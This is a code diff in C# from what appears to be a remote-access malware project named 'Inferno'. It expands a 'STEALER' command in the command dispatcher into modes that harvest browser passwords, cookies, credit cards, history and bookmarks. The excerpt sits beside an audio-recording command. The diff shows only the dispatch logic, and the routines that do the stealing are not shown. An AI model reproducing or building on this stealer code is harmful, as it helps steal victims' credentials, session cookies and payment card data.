@@ -68,9 +68,39 @@ namespace Inferno
                         audio.Record(Int32.Parse(arg2), arg1);
                         break;
                     }
-                case "STEALLER": // (null)
+                // Stealer
+                case "STEALER": // (PASSWORDS, COOKIES, CREDIT_CARDS, HISTORY, BOOKMARKS)
                     {
-                        Stealler.getPasswords();
+                        string s_mode = arg1.ToUpper();
+                        if (s_mode == "PASSWORDS")
+                        {
+                            Passwords.get();
+                        }
+                        else
+                            if (s_mode == "COOKIES")
+                        {
+                            Cookies.get();
+                        }
+                        else
+                            if (s_mode == "CREDIT_CARDS")
+                        {
+                            CreditCards.get();
+                        }
+                        else
+                            if (s_mode == "HISTORY")
+                        {
+                            History.get();
+                        }
+                        else
+                            if (s_mode == "BOOKMARKS")
+                        {
+                            Bookmarks.get();
+                        }
+                        else
+                        {
+                            output.error = true;
+                            core.Exit("Failed steal browser data, mode can be only PASSWORDS, COOKIES, CREDIT_CARDS, HISTORY or BOOKMARKS.", output);
+                        }
                         break;
                     }
                 // Audio
